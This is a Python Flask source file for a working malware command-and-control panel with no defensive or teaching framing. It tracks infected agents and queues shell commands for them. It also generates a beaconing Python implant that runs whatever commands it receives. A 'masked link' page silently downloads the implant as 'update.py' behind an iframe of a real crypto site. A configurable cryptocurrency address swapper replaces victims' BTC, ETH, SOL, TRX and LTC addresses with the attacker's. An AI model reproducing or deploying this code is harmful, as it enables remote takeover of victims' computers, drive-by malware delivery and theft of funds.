import os
import re
import uuid
from datetime import datetime
from urllib.parse import quote
from flask import Flask, request, jsonify, render_template_string, abort

PANEL_TOKEN = os.environ.get('PANEL_TOKEN')  # optional bearer token for panel/API

app = Flask(__name__)

# In-memory state
class AgentState:
    def __init__(self, info=None):
        self.info = info or {}
        self.last_seen = datetime.utcnow().isoformat()
        self.tasks = []
        self.results = []

agents = {}

# Address changer (clipboard/text transform) config
class HijackCfg:
    def __init__(self):
        self.enabled = False
        self.addresses = {
            'BTC': '',   # 26-35 alnum (1/3 bc1 prefixes)
            'ETH': '',   # 0x...
            'SOL': '',   # base58 ~43 chars
            'TRX': '',   # T...
            'LTC': '',   # L/M ltc1...
        }

cfg = HijackCfg()

page_tpl = '''
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Control Panel</title>
  <style>
    body { font-family: sans-serif; margin: 20px; }
    table { border-collapse: collapse; width: 100%; }
    th, td { border: 1px solid #ccc; padding: 6px; vertical-align: top; }
    th { background: #eee; }
    pre { white-space: pre-wrap; word-wrap: break-word; }
    .grid { display:grid; grid-template-columns: max-content 1fr; gap:6px; max-width:720px; }
  </style>
</head>
<body>
<h2>Control Panel</h2>
<p>Agents: {{ agents|length }}</p>

<h3>Address changer</h3>
<form method="post" action="/config" style="margin-bottom:12px;">
  <label><input type="checkbox" name="enabled" value="1" {% if cfg.enabled %}checked{% endif %}> Enable</label>
  <div class="grid" style="margin-top:8px;">
    <div>BTC:</div><input name="btc" value="{{ cfg.addresses.get('BTC','') }}"/>
    <div>ETH (0x):</div><input name="eth" value="{{ cfg.addresses.get('ETH','') }}"/>
    <div>SOL:</div><input name="sol" value="{{ cfg.addresses.get('SOL','') }}"/>
    <div>TRX:</div><input name="trx" value="{{ cfg.addresses.get('TRX','') }}"/>
    <div>LTC:</div><input name="ltc" value="{{ cfg.addresses.get('LTC','') }}"/>
  </div>
  <button type="submit" style="margin-top:6px;">Save</button>
</form>

<table>
  <tr>
    <th>Agent ID</th><th>Host/User</th><th>OS</th><th>Last Seen</th><th>Queue Task</th><th>Recent Results</th>
  </tr>
  {% for aid, a in agents.items() %}
  <tr>
    <td><code>{{ aid }}</code></td>
    <td>{{ a.info.get('hostname','?') }}/{{ a.info.get('username','?') }}</td>
    <td>{{ a.info.get('platform','?') }}</td>
    <td>{{ a.last_seen }}</td>
    <td>
      <form method="post" action="/api/queue_task">
        <input type="hidden" name="agent_id" value="{{ aid }}"/>
        <input type="text" name="cmd" placeholder="e.g., whoami" size="26"/>
        <button type="submit">Send</button>
      </form>
      <form method="post" action="/api/queue_task" style="margin-top:4px;">
        <input type="hidden" name="agent_id" value="{{ aid }}"/>
        <input type="hidden" name="cmd" value="uname -a"/>
        <button type="submit">uname -a</button>
      </form>
      <form method="post" action="/api/queue_task" style="margin-top:4px;">
        <input type="hidden" name="agent_id" value="{{ aid }}"/>
        <input type="hidden" name="cmd" value="id"/>
        <button type="submit">id</button>
      </form>
    </td>
    <td>
      {% for r in a.results[-3:] %}
        <div>
          <b>{{ r.ts }}</b> <small>task {{ r.task_id }}</small>
          <pre>{{ r.stdout }}</pre>
          {% if r.stderr %}<pre style="color:#900;">{{ r.stderr }}</pre>{% endif %}
        </div>
      {% endfor %}
    </td>
  </tr>
  {% endfor %}
</table>

<h3>Payload generator</h3>
<form method="get" action="/payload">
  C2 URL: <input type="text" name="server" value="http://127.0.0.1:8080" size="40"/>
  <button type="submit">Get Python payload</button>
</form>

<h3>Masked link</h3>
<form method="get" action="/gen_mask_link">
  Target URL: <input type="text" name="u" value="https://dexscreener.com/" size="60"/>
  Filename: <input type="text" name="fname" value="update.py"/>
  C2 URL (optional): <input type="text" name="server" value="" size="40"/>
  <button type="submit">Generate</button>
</form>

</body>
</html>
'''

def _auth_check():
    if not PANEL_TOKEN:
        return True
    auth = request.headers.get('Authorization', '')
    if auth.startswith('Bearer '):
        token = auth.split(' ', 1)[1]
        if token == PANEL_TOKEN:
            return True
    # also allow token query param for simple HTML links
    if request.args.get('token') == PANEL_TOKEN or request.form.get('token') == PANEL_TOKEN:
        return True
    return False

@app.before_request
def require_auth():
    # Protect panel and API endpoints except payload/mask and agent endpoints
    open_paths = {'/payload', '/mask', '/gen_mask_link', '/api/checkin', '/api/result'}
    if request.path in open_paths or request.path.startswith('/static/'):
        return
    if not _auth_check():
        return abort(401)

@app.get('/')
def index():
    return render_template_string(page_tpl, agents=agents, cfg=cfg)

@app.post('/config')
def set_config():
    if not _auth_check():
        return abort(401)
    cfg.enabled = bool(request.form.get('enabled'))
    for key, fkey in [('BTC','btc'),('ETH','eth'),('SOL','sol'),('TRX','trx'),('LTC','ltc')]:
        cfg.addresses[key] = (request.form.get(fkey) or '').strip()
    from flask import redirect
    return redirect('/')

@app.post('/api/checkin')
def checkin():
    data = request.get_json(force=True, silent=True) or {}
    agent_id = data.get('agent_id') or str(uuid.uuid4())
    info = data.get('info') or {}
    state = agents.get(agent_id)
    if state is None:
        state = AgentState(info=info)
        agents[agent_id] = state
    else:
        state.info.update(info)
    state.last_seen = datetime.utcnow().isoformat()
    task = None
    if state.tasks:
        task = state.tasks.pop(0)
    return jsonify({'agent_id': agent_id, 'task': task})

@app.post('/api/result')
def result():
    data = request.get_json(force=True, silent=True) or {}
    agent_id = data.get('agent_id')
    state = agents.get(agent_id)
    if not state:
        return jsonify({'error':'unknown agent'}), 404
    entry = {
        'task_id': data.get('task_id'),
        'stdout': data.get('stdout',''),
        'stderr': data.get('stderr',''),
        'code': data.get('code', 0),
        'ts': datetime.utcnow().isoformat()
    }
    state.results.append(entry)
    return jsonify({'ok': True})

@app.post('/api/queue_task')
def queue_task():
    if not _auth_check():
        return jsonify({'error':'unauthorized'}), 401
    agent_id = request.values.get('agent_id')
    cmd = request.values.get('cmd')
    if not agent_id or not cmd:
        return jsonify({'error':'agent_id and cmd required'}), 400
    state = agents.get(agent_id)
    if not state:
        return jsonify({'error':'unknown agent'}), 404
    task = {'id': str(uuid.uuid4()), 'type':'cmd', 'cmd': cmd}
    state.tasks.append(task)
    if request.content_type and 'application/json' in request.content_type:
        return jsonify({'queued': task})
    else:
        from flask import redirect
        return redirect('/')

@app.get('/api/agents')
def api_agents():
    if not _auth_check():
        return jsonify({'error':'unauthorized'}), 401
    out = {}
    for aid, a in agents.items():
        out[aid] = {
            'info': a.info,
            'last_seen': a.last_seen,
            'tasks': a.tasks,
            'results': a.results[-5:],
        }
    return jsonify(out)

@app.get('/api/config')
def api_config():
    if not _auth_check():
        return jsonify({'error':'unauthorized'}), 401
    return jsonify({'enabled': cfg.enabled, 'addresses': cfg.addresses})


def transform_text(text):
    if not cfg.enabled:
        return text
    out = text
    # ETH-like 0x... 40 hex
    eth = cfg.addresses.get('ETH')
    if eth:
        out = re.sub(r'0x[a-fA-F0-9]{40}', lambda m: eth if m.group(0).lower()!=eth.lower() else m.group(0), out)
    # BTC legacy/segwit (simplified)
    btc = cfg.addresses.get('BTC')
    if btc:
        out = re.sub(r'\b(bc1[0-9a-z]{20,60}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b', lambda m: btc if m.group(0)!=btc else m.group(0), out)
    # SOL base58 length ~32-44
    sol = cfg.addresses.get('SOL')
    if sol:
        out = re.sub(r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b', lambda m: sol if m.group(0)!=sol else m.group(0), out)
    # TRX addresses start with T and base58 len ~34
    trx = cfg.addresses.get('TRX')
    if trx:
        out = re.sub(r'\bT[1-9A-HJ-NP-Za-km-z]{25,33}\b', lambda m: trx if m.group(0)!=trx else m.group(0), out)
    # LTC legacy/segwit (simplified)
    ltc = cfg.addresses.get('LTC')
    if ltc:
        out = re.sub(r'\b(ltc1[0-9a-z]{20,60}|[LM3][a-km-zA-HJ-NP-Z1-9]{25,34})\b', lambda m: ltc if m.group(0)!=ltc else m.group(0), out)
    return out

@app.post('/api/transform')
def api_transform():
    if not _auth_check():
        return jsonify({'error':'unauthorized'}), 401
    data = request.get_json(force=True, silent=True) or {}
    text = data.get('text','')
    return jsonify({'out': transform_text(text)})

@app.get('/payload')
def payload():
    server = request.args.get('server', 'http://127.0.0.1:8080')
    code = f'''#!/usr/bin/env python3
import os, sys, json, time, subprocess, platform, socket, uuid
try:
    import urllib.request as urlreq
except Exception:
    import urllib2 as urlreq

SERVER = "{server}"
AGENT_ID = str(uuid.uuid4())

def sysinfo():
    uname = platform.uname()
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get('USER') or 'unknown'
    return {{
        'hostname': socket.gethostname(),
        'username': user,
        'platform': sys.platform,
        'release': getattr(uname, 'release', ''),
    }}

def http_post(path, payload):
    data = json.dumps(payload).encode('utf-8')
    req = urlreq.Request(SERVER + path, data=data, headers={{'Content-Type':'application/json'}})
    with urlreq.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read().decode('utf-8'))

while True:
    try:
        resp = http_post('/api/checkin', {{'agent_id': AGENT_ID, 'info': sysinfo()}})
        task = resp.get('task')
        if task and task.get('type') == 'cmd':
            cmd = task.get('cmd')
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                out, err = p.communicate(timeout=60)
                code = p.returncode
            except Exception as e:
                out, err, code = '', str(e), 1
            http_post('/api/result', {{'agent_id': AGENT_ID, 'task_id': task.get('id'), 'stdout': out, 'stderr': err, 'code': code}})
    except Exception as e:
        pass
    time.sleep(3)
'''
    return app.response_class(code, mimetype='text/x-python')

@app.get('/mask')
def mask():
    target = request.args.get('u', 'https://example.com')
    fname = request.args.get('fname', 'update.py')
    server = request.args.get('server') or request.host_url.rstrip('/')
    payload_url = f"{server}/payload?server={quote(server.rstrip('/'))}"
    html = f'''<!doctype html>
<html><head><meta charset="utf-8"><title>Loading…</title>
<meta name="referrer" content="no-referrer">
<style>html,body{{margin:0;height:100%}}iframe{{border:0;width:100%;height:100%}}</style>
<script>document.addEventListener('DOMContentLoaded',function(){{
  try{{
    var a=document.createElement('a');
    a.href='{payload_url}';
    a.download='{fname}';
    document.body.appendChild(a); a.click();
  }}catch(e){{}}
  setTimeout(function(){{ window.location.replace({target!r}); }}, 700);
}});</script>
</head>
<body>
<iframe src="{target}"></iframe>
</body></html>'''
    return app.response_class(html, mimetype='text/html')

@app.get('/gen_mask_link')
def gen_mask_link():
    target = request.args.get('u', 'https://dexscreener.com/')
    fname = request.args.get('fname', 'update.py')
    server = request.args.get('server') or request.host_url.rstrip('/')
    link = f"{server}/mask?u={quote(target)}&fname={quote(fname)}&server={quote(server)}"
    return jsonify({'masked_link': link})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', '8080'))
    app.run(host='0.0.0.0', port=port)
